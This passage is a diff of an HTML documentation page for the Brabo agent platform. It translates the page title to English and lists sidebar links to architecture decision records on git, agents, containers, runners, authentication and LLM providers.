@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>权限 | Brabo</title>
+<title>Permissions | Brabo</title>
 <meta name="robots" content="noindex, nofollow">
 <script src="../../assets/tema.js"></script>
 <link rel="stylesheet" href="../../assets/tokens.css">
@@ -21,60 +21,73 @@
 <button type="button" data-tema-alternar aria-label="切换主题">&#9680;</button>
 </header>
 <div class="site-corpo">
-<nav class="site-side" aria-label="docs"><section><h2>🚀 从这里开始</h2><ul><li><a href="../index.html">简介</a></li><li><a href="../getting-started.html">快速开始</a></li><li><a href="../tutorials/from-zero-to-deliverable.html">从零到交付物</a></li><li><a href="../tutorials/interface-antes-e-depois-shadcn.html">shadcn 前后的界面（2026 年 10 月 31 日）</a></li></ul></section><section><h2>🏗️ 架构</h2><ul><li><a href="../architecture.html">架构</a></li><li><a href="../adr.html">决策（ADR）</a><ul><li><span>Git, repositório e política de branches</span><ul><li><a href="../adr/0001-git-provider-contract-shape.html">ADR 0001 — GitProvider 规范化契约的形态</a></li><li><a href="../adr/0002-git-error-normalization.html">ADR 0002 — GitProvider 错误的规范化</a></li><li><a href="../adr/0003-git-provider-retry-policy.html">ADR 0003 — 远程 provider 的重试策略</a></li><li><a href="../adr/0004-git-credential-registration.html">ADR 0004 — 用户 git 凭据的登记</a></li><li><a href="../adr/0005-repo-bootstrap-idempotent-steps.html">ADR 0005 — 幂等且可恢复的 Gitflow bootstrap</a></li><li><a href="../adr/0028-protecao-de-branch-divergencia-entre-providers.html">ADR 0028 — 分支保护：provider 之间的分歧与审批矩阵</a></li><li><a href="../adr/0030-politica-de-branches-mecanizada.html">ADR 0030 — 机制化的分支策略</a></li><li><a href="../adr/0044-adocao-de-repositorio-existente.html">ADR 0044 — 采纳现有仓库，以及作为关口的计划</a></li><li><a href="../adr/0056-o-engine-trabalha-em-repositorio-remoto.html">ADR 0056 — engine 在远程仓库上工作</a></li><li><a href="../adr/0139-o-alarme-de-esteira-ganha-destinatario.html">ADR 0139 — 流水线合并的告警获得接收方，以及 `dev` 的规则</a></li><li><a href="../adr/0165-o-repositorio-nasce-no-handoff-ao-arquiteto.html">ADR 0165 — 仓库在接受给 Arquiteto 的 handoff 时诞生，没有它执行就不会开始</a></li><li><a href="../adr/0217-promocao-automatica-para-qa-em-fase-de-teste.html">ADR 0217 — QA 处于测试阶段时，`dev` → `qa` 自动晋升</a></li><li><a href="../adr/0235-a-qa-e-aposentada-e-a-esteira-fica-dev-e-main.html">ADR 0235 — `qa` 暂时退役，仓库的流水线变为 `dev → main`</a></li><li><a href="../adr/0236-o-dependabot-dispensa-revisao-na-dev.html">ADR 0236 — Dependabot 在 `dev` 上免于审查，其他检查全绿即可合并</a></li><li><a href="../adr/0255-politica-de-pr-obrigatoria-em-todos-os-repos.html">ADR 0255 — A política de PR é obrigatória em todos os repositórios e a PR de regeneração do bot dispensa a escada na dev</a></li></ul></li><li><span>Harness de agente, turnos e sessões</span><ul><li><a href="../adr/0006-prompt-assembler-context-harness.html">ADR 0006 — agent 的 harness：确定性的上下文组装</a></li><li><a href="../adr/0007-toolloop-tools-context-manager.html">ADR 0007 — ToolLoop、工具、ContextManager（带 LLM 的 harness）</a></li><li><a href="../adr/0061-tipo-da-sessao-na-criacao.html">ADR 0061 — 会话的类型是创建时的数据，而执行仍然是事件</a></li><li><a href="../adr/0098-limites-de-transporte-e-janela-efetiva-de-compactacao.html">ADR 0098 — 一致的传输限制与有效的压缩窗口</a></li><li><a href="../adr/0163-o-clique-responde-ao-aceitar.html">ADR 0163 — 点击在**接受**命令时响应，轮次经由通道继续</a></li><li><a href="../adr/0175-infra-lead-conversa-pelo-composer.html">ADR 0175 — Infra Lead 通过 composer 对话，在此之前它的回合先经过 `TurnoAssincrono`</a></li><li><a href="../adr/0177-idioma-das-respostas-por-conta-sessao-e-projeto.html">ADR 0177 — 回答的语言存放在三个地方——账户、会话和项目——采用开放的 BCP-47 列表，绝不放在 `users.locale` 中</a></li><li><a href="../adr/0179-o-laco-pergunta-ao-jev-qual-ferramenta.html">ADR 0179 — 循环向 Jev 询问用哪个工具，用户的模型只看到剩下的菜单</a></li><li><a href="../adr/0183-reabrir-sessao-encerrada.html">ADR 0183 — 已结束的会话可以重新打开：终止状态的专属出口，通向 `active`，带新事件</a></li><li><a href="../adr/0184-reabrir-sessao-decisoes-do-dono.html">ADR 0184 — 重新打开会话：所有者的三个决定，`developer` 即可重新打开</a></li><li><a href="../adr/0191-a-mensagem-com-turno-em-curso-entra-numa-fila.html">ADR 0191 — 在轮次进行中到达的消息进入持久化队列，并在轮次结束时被读取</a></li><li><a href="../adr/0226-diario-vivo-e-retomada-dos-agentes.html">ADR 0226 — 活的日志与智能体恢复：被中断的回合凭计划恢复一次</a></li><li><a href="../adr/0246-anexos-do-chat-bytes-no-postgres-referencia-no-evento.html">ADR 0246 — 聊天附件：字节存于 Postgres，事件中存引用，视觉能力由 capability 决定</a></li><li><a href="../adr/0247-uma-mensagem-varios-destinatarios.html">ADR 0247 — 一条消息，多个收件人</a></li><li><a href="../adr/0249-o-raciocinio-do-agente-e-gravado-e-mostrado-so-a-developer.html">ADR 0249 — 智能体的推理被记录，且仅向 developer 及以上显示</a></li></ul></li><li><span>O time de agentes — papéis, áreas e handoffs</span><ul><li><a href="../adr/0008-agente-criativo-conversacional-handoffs.html">ADR 0008 — harness 中的对话式 Criativo agent + handoff 的基础</a></li><li><a href="../adr/0009-agente-po-backlog-rastreabilidade.html">ADR 0009 — PO agent、backlog（epics/stories/tasks）与可追溯性</a></li><li><a href="../adr/0010-agente-arquiteto-adr-pr-module-map.html">ADR 0010 — Arquiteto agent：通过真实 PR 的 ADR、module_map 和交叉验证</a></li><li><a href="../adr/0014-infra-agent-painel-phoenix.html">ADR 0014 — InfraAgent 与实时团队面板（Fase 4a 收尾）</a></li><li><a href="../adr/0015-psicologo-real-toolloop-hipoteses-evidencia.html">ADR 0015 — 真正的 Psicólogo：ToolLoop、带证据的假设与成本分诊</a></li><li><a href="../adr/0016-anamnese-proficiencia-patches-instrucao.html">ADR 0016 — Anamnese：熟练度画像、指令补丁与闭环</a></li><li><a href="../adr/0022-fechamento-4b-psicologo.html">ADR 0022 — 阶段 4b 的收尾（第 1 次会话）：能送达的证据、能显示的成本、能在 kill 之后存活的分析</a></li><li><a href="../adr/0023-fechamento-4b-anamnese.html">ADR 0023 — 阶段 4b 的收尾（第 2 次会话）：能工作的目录、能区分谁拒绝的去重，以及能在一轮之后存活的队列</a></li><li><a href="../adr/0038-hierarquia-de-agentes.html">ADR 0038 — agent 的层级：领域、lead 与委派</a></li><li><a href="../adr/0046-promocao-de-story-com-autoridade-do-usuario.html">ADR 0046 — 由用户拥有权限的故事晋升</a></li><li><a href="../adr/0053-dev-lead-e-paralelismo-autorizado.html">ADR 0053 — Dev Lead 作为区域，以及由用户授权的并行</a></li><li><a href="../adr/0068-diagrama-c4-do-arquiteto.html">ADR 0068 — Arquiteto 的 C4 图</a></li><li><a href="../adr/0069-fusao-condicional-do-handoff-com-a-ativacao-de-execucao.html">ADR 0069 — 有条件地合并 handoff 的接受与执行的启用</a></li><li><a href="../adr/0085-fluxo-como-registro-declarativo.html">ADR 0085 — 角色流作为声明式登记（fluxo.yml）</a></li><li><a href="../adr/0086-dev-lead-plano-suspende-para-aprovacao.html">ADR 0086 — Dev Lead 的计划挂起轮次以等待审批</a></li><li><a href="../adr/0087-ux-designer-agente.html">ADR 0087 — UX Designer 作为对话式 agent 加入</a></li><li><a href="../adr/0088-staff-agente-dormente-para-disparo-automatico.html">ADR 0088 — Staff：代码就绪，自动触发处于休眠</a></li><li><a href="../adr/0089-analytics-e-delivery-metricas-como-relatorio.html">ADR 0089 — `analytics` 和 `delivery-metricas` 成为报表脚本</a></li><li><a href="../adr/0092-platform-relatorio-de-telemetria-sob-demanda.html">ADR 0092 — `platform` 以按需报告脚本的形式诞生，而不是 agent</a></li><li><a href="../adr/0093-dbre-linter-de-migracao-e-relatorio-de-backup.html">ADR 0093 — `dbre` 角色变成两个脚本：迁移 linter 和备份报告</a></li><li><a href="../adr/0094-delegacao-dev-lead-vira-dado.html">ADR 0094 — Dev Lead → dev 的委派成为数据，`parecerArtifactId` 被重新定义</a></li><li><a href="../adr/0109-handoff-manual-a-agente-a-escolha.html">ADR 0109 — 向任选 agent 的手动 handoff 复用&quot;提供 + 接受&quot;，绝不引入第三种 handoff 状态</a></li><li><a href="../adr/0182-ciclo-de-vida-do-handoff.html">ADR 0182 — handoff 提议获得生命周期：每个目标一个待处理，以及 `superseded`</a></li><li><a href="../adr/0185-estou-pronto-fecha-os-dois-gates.html">ADR 0185 — &quot;Estou pronto — a necessidade está validada&quot;：一次点击同时关闭就绪确认、gate `necessidade-validada` 和 PO 的接受</a></li><li><a href="../adr/0186-aceite-automatico-do-handoff-ao-arquiteto.html">ADR 0186 — 当 backlog 已覆盖且仓库为本地时，PO 给 Arquiteto 的 handoff 无需点击即被接受</a></li><li><a href="../adr/0194-aprovar-o-plano-ativa-a-execucao.html">ADR 0194 — 批准 Dev Lead 的计划会激活执行，任务获得它所分配的模块</a></li><li><a href="../adr/0212-historia-arquivada.html">ADR 0212 — 已归档的故事：一列，而不是状态机中的一个状态</a></li><li><a href="../adr/0213-o-entregavel-roda-na-maquina-pelo-compose-da-infra.html">ADR 0213 — 交付物通过 Infra 的 compose 在用户的机器上运行</a></li><li><a href="../adr/0259-o-modulo-de-que-outros-dependem-tem-dono.html">ADR 0259 — 被其他模块依赖的模块在执行计划中必须有负责人</a></li></ul></li><li><span>Gates, QA e revisão de segurança</span><ul><li><a href="../adr/0013-gates-qa-secops-pr.html">ADR 0013 — PR 的 gate：QAAgent 和 SecOpsAgent</a></li><li><a href="../adr/0020-destravar-gates-qa-secops.html">ADR 0020 — 解锁 QA 与 SecOps 的 gate：在工作树上运行 gitleaks、经过校验的意见书，以及文本形式的 tool call</a></li><li><a href="../adr/0021-fechamento-4a-infra-e-painel.html">ADR 0021 — 阶段 4a 的收尾：真正做校验的 infra gate，以及说真话的面板</a></li><li><a href="../adr/0054-gates-como-registro-declarativo.html">ADR 0054 — gate 作为声明式登记</a></li><li><a href="../adr/0057-o-gate-espera-a-aprovacao.html">ADR 0057 — gate agent 等待审批，就像 dev 那样等待</a></li><li><a href="../adr/0067-o-gate-sobrevive-ao-restart.html">ADR 0067 — gate 在重启后存活</a></li><li><a href="../adr/0090-qa-estrategia-e-appsec-segundo-momento.html">ADR 0090 — QA 策略和 AppSec 作为第二个**时刻**，而不是新 agent</a></li><li><a href="../adr/0091-secops-runtime-relatorio-de-abuso.html">ADR 0091 — `secops-runtime` 作为基于 `rate_limit_hits` 的报告脚本</a></li><li><a href="../adr/0095-gate-necessidade-validada.html">ADR 0095 — gate `necessidade-validada` 由单独的人工确认关闭，而不是由 Criativo 自我验证</a></li><li><a href="../adr/0123-golden-set-regressao-qa-automacao.html">ADR 0123 — 为 QA Automação agent 的语义判断建立回归用例 golden-set</a></li><li><a href="../adr/0168-golden-set-do-qa-em-ci-semanal.html">ADR 0168 — QA 的 golden-set 开始在 CI 中按周定时运行</a></li><li><a href="../adr/0192-plano-de-teste-depois-da-entrega.html">ADR 0192 — 测试计划在 dev 交付之后诞生，gate `implementavel` 改为基于故事和 `module_map` 进行判断</a></li><li><a href="../adr/0207-ciclo-de-gate-velho-estaciona.html">ADR 0207 — 停滞超过 2 小时的 gate 周期会被搁置，只有人工操作才能恢复</a></li><li><a href="../adr/0214-pergunta-em-aberto-vira-pendencia.html">ADR 0214 — 悬而未决的问题成为待解决的待办</a></li><li><a href="../adr/0215-decisao-do-projeto-chega-ao-dev-e-ao-qa.html">ADR 0215 — 项目的决定传达到 dev 和 QA</a></li><li><a href="../adr/0258-a-resposta-pelo-chat-fecha-a-pergunta-em-aberto.html">ADR 0258 — 在聊天中给出的回答关闭悬而未决的问题</a></li></ul></li><li><span>Execução, política de terminal e aprovações</span><ul><li><a href="../adr/0011-infra-dev-agents-worktrees-merge-lock.html">ADR 0011 — dev agent 的基础设施：worktree、git 执行器和合并锁</a></li><li><a href="../adr/0012-dev-agent-real-toolloop-orcamento-bloqueio.html">ADR 0012 — 真正的 DevAgent：ToolLoop、按 task 的预算与阻塞纪律</a></li><li><a href="../adr/0017-lock-de-workspace-e-monitor-de-dev-agents.html">ADR 0017 — 工作区初始化锁、dev agent 的 Monitor 以及上限继承</a></li><li><a href="../adr/0018-noop-dev-agent-modo-de-execucao.html">ADR 0018 — NoopDevAgent 作为永久的执行模式</a></li><li><a href="../adr/0019-destravar-dev-agent-adr-por-modulo-orcamento-projeto.html">ADR 0019 — 解锁真实的 DevAgent：写入、终端、按模块的 ADR 和按项目的预算</a></li><li><a href="../adr/0045-reagendamento-por-evento-do-dev-agent.html">ADR 0045 — dev agent 的按事件重新调度，以及熔断器</a></li><li><a href="../adr/0047-operabilidade-pos-dogfooding.html">ADR 0047 — dogfooding 之后的可运维性：Fase 12 的收尾</a></li><li><a href="../adr/0048-decisao-no-log-e-a-ordem-do-gate.html">ADR 0048 — event log 中的决定，以及 gate 的顺序</a></li><li><a href="../adr/0052-dev-agent-espera-aprovacao-no-meio-do-laco.html">ADR 0052 — dev agent 在循环中途等待审批</a></li><li><a href="../adr/0055-escopo-de-caminho-na-politica-de-terminal.html">ADR 0055 — 终端策略中的路径范围</a></li><li><a href="../adr/0102-revisao-do-adr-0065-teto-absoluto-substitui-deny.html">ADR 0102 — 修订 ADR 0065：外部效果的边界不再是 `deny`，而是绝对上限</a></li><li><a href="../adr/0167-modo-automatico-libera-o-escopo-de-caminho.html">ADR 0167 — 自动模式放行路径范围，而且只有它放行</a></li><li><a href="../adr/0189-o-piloto-automatico.html">ADR 0189 — 自动驾驶：自动模式批准一切（上限除外），作用域与真实执行目录比较，&quot;始终允许&quot;记录动词 + 子命令</a></li><li><a href="../adr/0204-modo-automatico-libera-push-e-pr.html">ADR 0204 — 自动模式放行 push 和 PR</a></li></ul></li><li><span>Onde o código mora — modos de execução</span><ul><li><a href="../adr/0066-nome-de-pasta-legivel-do-workspace.html">ADR 0066 — 可读的 workspace 文件夹名称</a></li><li><a href="../adr/0072-projeto-local-ou-container.html">ADR 0072 — 项目选择代码存放在哪里：用户目录还是托管目录</a></li><li><a href="../adr/0104-execution-mode-tres-valores-e-workspace-verificado-pelo-runner.html">ADR 0104 — `execution_mode` 取三个值，由 runner 负责验证时 workspace 以 `unverified` 诞生</a></li><li><a href="../adr/0107-navegacao-de-pasta-local-via-o-runner.html">ADR 0107 — 通过 Runner 浏览本地文件夹</a></li><li><a href="../adr/0108-projeto-runner-nasce-ao-navegar-pasta-no-wizard.html">ADR 0108 — 在 `runner` 模式下，项目在点击“Navegar pasta...”时诞生，而不只是在确认时</a></li><li><a href="../adr/0111-conversao-de-execution-mode-de-projeto-existente.html">ADR 0111 — 转换已有项目的 `execution_mode`：dev agent 活动时拒绝，迁移 `permissions.json`，退役容器行</a></li><li><a href="../adr/0141-base-unica-dos-projetos-montados.html">ADR 0141 — 挂载项目的唯一 base，按同一路径挂载</a></li><li><a href="../adr/0142-validacao-de-workspace-montado-adiada.html">ADR 0142 — 挂载 workspace 的验证推迟到实体化时进行</a></li><li><a href="../adr/0146-base-consentida-no-bootstrap.html">ADR 0146 — 在 bootstrap 中经同意设定的 base，以及 `mounted` 作为本地默认值</a></li></ul></li><li><span>Container do projeto e broker</span><ul><li><a href="../adr/0065-container-por-projeto-a-fronteira-deixa-de-ser-politica.html">ADR 0065 — 每个项目一个容器：边界不再是策略</a></li><li><a href="../adr/0081-ciclo-de-vida-do-container-tabela-sem-orquestrador.html">ADR 0081 — 容器生命周期：状态表，没有编排器</a></li><li><a href="../adr/0083-terminal-mostra-estado-real-do-container.html">ADR 0083 — 终端标签页获得生命周期的真实使用者，而不是终端</a></li><li><a href="../adr/0128-porta-de-docker-e-a-prova-de-empacotamento.html">ADR 0128 — Docker 端口，以及选定实现的打包证明</a></li><li><a href="../adr/0130-broker-de-container.html">ADR 0130 — 容器 broker：谁与服务器的 Docker 对话，以及它为什么不接受规格</a></li><li><a href="../adr/0131-roteamento-de-modulos-para-infra.html">ADR 0131 — Arquiteto 把模块路由给 infra：它**提名**，Infra **选定**</a></li><li><a href="../adr/0133-infra-elege-imagem-do-roteamento.html">ADR 0133 — Infra 在路由的候选项中做出选择，选择结果成为 `artifact.project_image` 的新版本</a></li><li><a href="../adr/0134-dev-agents-executam-dentro-do-container.html">ADR 0134 — dev agent 在项目的真实容器**内部**执行，终端在其中获得一个自动批准的下限</a></li><li><a href="../adr/0135-portao-de-imagem-nos-tres-modos.html">ADR 0135 — Arquiteto 的镜像关口（RN-105）开始在三种执行模式下生效</a></li><li><a href="../adr/0136-pagina-global-de-containers.html">ADR 0136 — 全局容器页面：broker 按加载设上限，`container_remove` 纳入绝对上限</a></li><li><a href="../adr/0137-o-runner-sobe-o-container-do-projeto.html">ADR 0137 — `brabo-runner` 在用户的机器上启动项目容器</a></li><li><a href="../adr/0143-agentes-de-dev-so-depois-do-container.html">ADR 0143 — dev agent 只在容器之后</a></li><li><a href="../adr/0144-a-segunda-raiz-do-broker.html">ADR 0144 — broker 的第二个根，以及选择它的可辨识定位符</a></li><li><a href="../adr/0180-container-com-o-dono-da-pasta.html">ADR 0180 — 项目容器以文件夹所有者身份运行，由 api 测量</a></li><li><a href="../adr/0190-a-infra-sobe-o-container-no-aceite.html">ADR 0190 — Infra 在接受 handoff 时启动容器，由服务器执行这一步并预置自主度，并由它交接给 Dev Lead</a></li><li><a href="../adr/0199-recurso-minimo-derivado-do-module-map.html">ADR 0199 — 容器的最低资源从 `module_map` 派生：每个模块声明自己的，Infra 按总和启动</a></li><li><a href="../adr/0208-a-infra-herda-a-rede-do-arquiteto.html">ADR 0208 — Infra 继承 Arquiteto 声明的网络</a></li><li><a href="../adr/0228-comando-do-app-e-rede-do-container.html">ADR 0228 — 项目容器通过声明的命令启动应用，并且仅在 loopback 上发布端口</a></li><li><a href="../adr/0229-instancia-de-qa-efemera-com-servicos-declarados-pela-infra.html">ADR 0229 — QA 在临时实例中测试，使用 Infra 声明的服务</a></li></ul></li><li><span>O runner local</span><ul><li><a href="../adr/0103-runner-local-execucao-na-maquina-do-usuario.html">ADR 0103 — 本地 runner：通过带一次性 ticket 的 Phoenix 通道在用户机器上执行</a></li><li><a href="../adr/0105-personal-access-token-do-runner-escopado-por-construcao.html">ADR 0105 — 给 runner 的 Personal Access Token（`brb_…`），按构造限定到一条路由</a></li><li><a href="../adr/0106-distribuicao-do-runner-via-tsup-e-npm-publish.html">ADR 0106 — 通过 `tsup` 和 `npm publish` 分发 `@brabo/runner`，版本只在 CI 中注入</a></li><li><a href="../adr/0112-binario-standalone-do-runner-via-bun-build-compile.html">ADR 0112 — 通过 `bun build --compile` 构建 `@brabo/runner` 的独立二进制，原生插件 `.node` 通过真实解压到临时目录的方式嵌入</a></li><li><a href="../adr/0118-configuracao-automatica-do-runner-pelo-navegador.html">ADR 0118 — 通过浏览器配置 runner：Ed25519 设备密钥作为 `runner-ticket` 的第二种凭据、GitHub Releases 的二进制代理，以及用 File System Access API 一键配置文件夹</a></li><li><a href="../adr/0145-docker-pre-requisito-do-runner.html">ADR 0145 — Docker 成为 `runner` 模式的真正前提</a></li><li><a href="../adr/0147-agente-local-com-capacidades.html">ADR 0147 — 一个本地 agent，在连接时声明能力</a></li><li><a href="../adr/0151-base-consentida-no-runner.html">ADR 0151 — runner 中经同意的基础目录，以及通过通道创建文件夹</a></li><li><a href="../adr/0154-chave-de-dispositivo-de-maquina.html">ADR 0154 — 机器级的设备密钥</a></li><li><a href="../adr/0174-runner-sem-binario-darwin-x64.html">ADR 0174 — runner 的独立二进制不再承诺 Mac Intel</a></li><li><a href="../adr/0187-runner-sem-binario-win32-x64.html">ADR 0187 — runner 的独立二进制不再承诺 Windows</a></li><li><a href="../adr/0193-git-credenciado-no-host-do-runner.html">ADR 0193 — 带凭据的 git 在 runner 的**宿主机**上运行；代码在容器中运行</a></li><li><a href="../adr/0201-revogacao-por-chave.html">ADR 0201 — 吊销针对的是**密钥**，而不是 `{projeto, usuário}` 这一对</a></li><li><a href="../adr/0203-aposenta-o-fluxo-do-runner-pelo-navegador.html">ADR 0203 — 通过浏览器配置 runner 的流程退役，路径改为安装程序</a></li><li><a href="../adr/0230-importar-chave-de-llm-pelo-runner.html">ADR 0230 — runner 导入用户机器上已有的 LLM API 密钥</a></li></ul></li><li><span>Autenticação, acesso e segredos</span><ul><li><a href="../adr/0031-auth-first-party-argon2id-e-rotacao-de-refresh.html">ADR 0031 — 自有认证：argon2id、EdDSA 与 refresh 轮换</a></li><li><a href="../adr/0032-corte-do-keycloak-e-sessao-em-cookie.html">ADR 0032 — 切除 Keycloak：自有签发方、service token 与 cookie 中的会话</a></li><li><a href="../adr/0037-cors-do-engine-e-a-porta-como-contrato.html">ADR 0037 — engine 所缺的 CORS，以及端口作为契约的一部分</a></li><li><a href="../adr/0050-credencial-sempre-cifrada-verificacao-explicita.html">ADR 0050 — 凭据总是被加密；验证成为显式动作</a></li><li><a href="../adr/0058-csp-fechado-na-api-e-escopo-de-projeto-contido.html">ADR 0058 — api 中封闭的 CSP，以及约束在根内的项目范围</a></li><li><a href="../adr/0059-segredo-do-state-de-oauth-sem-default.html">ADR 0059 — 签署 git OAuth `state` 的密钥没有默认值</a></li><li><a href="../adr/0084-login-social-github-e-gitlab.html">ADR 0084 — 社交登录（GitHub/GitLab），修订 ADR 0031/0032 的 backlog</a></li><li><a href="../adr/0096-smtp-real-no-mailsender.html">ADR 0096 — `MailSender` 中的真实 SMTP，置于显式开关之后</a></li><li><a href="../adr/0127-tetos-de-rebaixamento-em-project-members.html">ADR 0127 — `project_members` 中的两道降级上限，覆盖关系保留</a></li><li><a href="../adr/0156-teto-de-auto-rebaixamento-na-remocao.html">ADR 0156 — 自我降级上限同样适用于移除项目成员</a></li><li><a href="../adr/0157-teto-de-auto-movimento-no-upsert-de-workspace.html">ADR 0157 — workspace upsert 中的自我变动上限，以及原本是漏洞的自我晋升</a></li><li><a href="../adr/0158-o-id-da-chave-mestra-gravado-no-envelope.html">ADR 0158 — 主密钥的 id 写入信封，作为可观测性，绝不作为权威</a></li><li><a href="../adr/0173-remocao-de-membro-de-workspace.html">ADR 0173 — workspace 成员的移除诞生，由同一条款保护</a></li><li><a href="../adr/0245-acesso-rapido-por-papel-so-no-ambiente-local.html">ADR 0245 — 按角色快速访问仅限本地环境</a></li></ul></li><li><span>Providers de LLM, modelos e gasto</span><ul><li><a href="../adr/0040-moeda-do-dashboard.html">ADR 0040 — 仪表盘的货币：暂用 USD，按 workspace 的手动汇率推迟</a></li><li><a href="../adr/0041-base-openai-compativel-e-contrato-de-llm-providers.html">ADR 0041 — 一个 OpenAI 兼容基类、一份 LLM provider 合约，以及会拒绝 binding 的 capabilities</a></li><li><a href="../adr/0042-catalogo-vivo-ciclo-de-vida-do-modelo-e-preco-auditavel.html">ADR 0042 — 活目录、模型生命周期与可审计的价格</a></li><li><a href="../adr/0043-seis-providers-de-llm-e-o-fechamento-da-fase-9b.html">ADR 0043 — 在基础之上的六个 LLM provider，Fase 9b 终于关闭</a></li><li><a href="../adr/0049-curadoria-de-modelo-por-workspace.html">ADR 0049 — 按 workspace 的模型策展</a></li><li><a href="../adr/0051-facetas-de-capability-e-curadoria-por-uso.html">ADR 0051 — 已证明的能力维度；“用来做什么”是策展</a></li><li><a href="../adr/0063-duas-audiencias-para-o-mesmo-gasto.html">ADR 0063 — 同一笔花费的两种受众：owner 的账单与成员的消耗</a></li><li><a href="../adr/0064-escopo-de-area-na-cascata-e-o-binding-de-agente-global.html">ADR 0064 — 模型级联中的领域范围，以及全局的 agent 绑定</a></li><li><a href="../adr/0075-embeddings-no-contrato-de-llm-provider.html">ADR 0075 — LLMProvider 合约中的 embedding</a></li><li><a href="../adr/0076-provider-volta-a-ser-dimensao-de-gasto.html">ADR 0076 — `provider` 重新成为花费维度，约束改由类型承担</a></li><li><a href="../adr/0077-ranking-de-modelos-por-capacidade-sem-nota-inventada.html">ADR 0077 — 按能力的模型排名，不编造评分</a></li><li><a href="../adr/0110-budget-por-area-aditivo-nao-cascata.html">ADR 0110 — 按区域的预算是叠加的，与项目/会话并列——不是级联，也不是新表</a></li><li><a href="../adr/0114-deteccao-de-ollama-nativo-no-bootstrap-dev.html">ADR 0114 — 在开发引导中检测原生 Ollama：只问一次，持久化到 `.env`，把 compose 的服务放到 profile 之后</a></li><li><a href="../adr/0115-pedido-de-pull-de-modelo-huggingface-tabela-propria.html">ADR 0115 — 从 Hugging Face 拉取模型：独立的表、两步确认以及官方发布者 allowlist——绝不使用 `proposed_actions`</a></li><li><a href="../adr/0166-preferencia-de-roteamento-no-binding-de-modelo.html">ADR 0166 — 路由偏好住在模型 binding 中，随它一起传递，并在计量中冻结</a></li><li><a href="../adr/0188-o-custo-real-do-provider-vira-o-numero-do-metering.html">ADR 0188 — provider 返回的真实成本成为计量的数字</a></li><li><a href="../adr/0198-duplicata-semantica-por-embedding-com-limiar-que-so-avisa.html">ADR 0198 — 故事与规则的语义重复通过带阈值的 embedding 提醒，花费进入计量</a></li><li><a href="../adr/0221-upstream-preso-por-sessao.html">ADR 0221 — hub 按 `session_id` 将每个智能体的对话绑定到服务它的 upstream</a></li><li><a href="../adr/0222-provider-9router-de-llm.html">ADR 0222 — 9Router 成为第 10 个 LLM provider，URL 按安装配置</a></li><li><a href="../adr/0223-orcamento-de-raciocinio-por-modelo.html">ADR 0223 — 推理预算是按模型的 capability，人工策展</a></li><li><a href="../adr/0224-raciocinio-abortado-no-stream.html">ADR 0224 — 推理在 stream 中被计数并在上限处中止，成本先估算再对账</a></li><li><a href="../adr/0225-teto-de-preco-do-upstream-no-openrouter.html">ADR 0225 — OpenRouter 每次调用获得价格上限（`provider.max_price` = 目录价 × 1,5）</a></li><li><a href="../adr/0227-provider-opencode-zen-de-llm.html">ADR 0227 — OpenCode Zen 成为第 11 个 LLM provider，仅使用 OpenAI 方言</a></li><li><a href="../adr/0233-membro-ve-o-gasto-do-projeto-sem-credencial.html">ADR 0233 — 成员按智能体和领域查看项目开销，绝不按 provider</a></li><li><a href="../adr/0251-preco-de-lista-datado-para-provider-sem-preco.html">ADR 0251 — 对不提供价格的 provider，在代码中标注日期的标价</a></li><li><a href="../adr/0257-na-anthropic-direta-o-raciocinio-desligado-e-por-modelo.html">ADR 0257 — Na Anthropic direta o raciocínio desligado é por modelo e o esforço reduz o Opus</a></li></ul></li><li><span>RAG, grafo de conhecimento e artefatos</span><ul><li><a href="../adr/0079-tabela-de-chunks-vetor-e-tsvector-juntos.html">ADR 0079 — chunk 表：向量与 `tsvector` 在同一行</a></li><li><a href="../adr/0080-busca-hibrida-pesos-limiar-e-citacao.html">ADR 0080 — 混合搜索：权重、阈值，以及什么算引用</a></li><li><a href="../adr/0082-chat-rag-aba-de-busca-hibrida.html">ADR 0082 — Chat RAG：混合搜索的独立标签页，不重命名“Chat”</a></li><li><a href="../adr/0099-neo4j-grafo-de-conhecimento-e-templates.html">ADR 0099 — Neo4j 作为知识图谱和 prompt 模板，驱动放在 api 中</a></li><li><a href="../adr/0100-rag-search-e-modelos-garantidos-no-boot.html">ADR 0100 — 面向 agent 的 `rag_search`，以及启动时确保存在的 Ollama 模型</a></li><li><a href="../adr/0101-memoria-relacional-como-projecao-do-event-log.html">ADR 0101 — 关系记忆作为事件日志的投影；在不触碰 GenServer 的情况下使用模板</a></li><li><a href="../adr/0113-pasta-local-anexada-via-navegador-vira-chunks-scope-local.html">ADR 0113 — 附加的本地目录成为 `chunks.scope = 'local'`，由**浏览器**读取，绝不是主机路径</a></li><li><a href="../adr/0129-telemetria-de-busca-do-rag-como-tabela.html">ADR 0129 — RAG 搜索的遥测是**表**，权重冻结在行中</a></li><li><a href="../adr/0132-golden-set-de-acerto-do-rag.html">ADR 0132 — RAG 命中率的 golden-set，以及 gate `rag-acertivo`</a></li><li><a href="../adr/0138-golden-set-do-rag-em-ci-agendado.html">ADR 0138 — RAG 的 golden-set 开始在 CI 中定时运行——并且仍然是 `warn`</a></li><li><a href="../adr/0148-artefatos-projetados-em-arquivo.html">ADR 0148 — agent 的工件以文件形式投影到一个 `docs/` 目录</a></li><li><a href="../adr/0196-anamnese-religada-com-sujeito-e-fato-do-perfil.html">ADR 0196 — 重新启用的 Anamnese：没有主体就不运行，被接受的假设成为画像事实</a></li><li><a href="../adr/0200-contrato-entre-modulos-artefato-do-arquiteto.html">ADR 0200 — 模块间合约成为 Arquiteto 的版本化工件，dev agent 读取它而不是别人的 worktree</a></li><li><a href="../adr/0205-desvio-do-agente-como-sinal-do-produto.html">ADR 0205 — Anamnese 观察到的 agent 偏差成为产品信号，不含个人数据</a></li></ul></li><li><span>Interface web e design system</span><ul><li><a href="../adr/0036-telas-de-auth-fieis-ao-design-e-fontes-auto-hospedadas.html">ADR 0036 — 忠实于设计的认证界面，以及三种无法加载的字体</a></li><li><a href="../adr/0060-superficie-de-leitura-de-codigo.html">ADR 0060 — 代码的读取面，受约束且有预算</a></li><li><a href="../adr/0074-tema-alcancavel-e-o-boot-sob-csp.html">ADR 0074 — 可切换的主题，以及 CSP 下的启动</a></li><li><a href="../adr/0078-moldura-de-tela-e-o-registro-de-abas-diverge-do-handoff.html">ADR 0078 — 界面框架，以及标签页注册表刻意偏离 handoff</a></li><li><a href="../adr/0097-leitura-direta-do-schema-do-engine-para-online-agent-count.html">ADR 0097 — 为仪表盘的“N 个 agent 在线”直接读取 engine 的 schema</a></li><li><a href="../adr/0116-tipos-do-web-gerados-do-openapi.html">ADR 0116 — `ActionType`（以及将来的类型）由 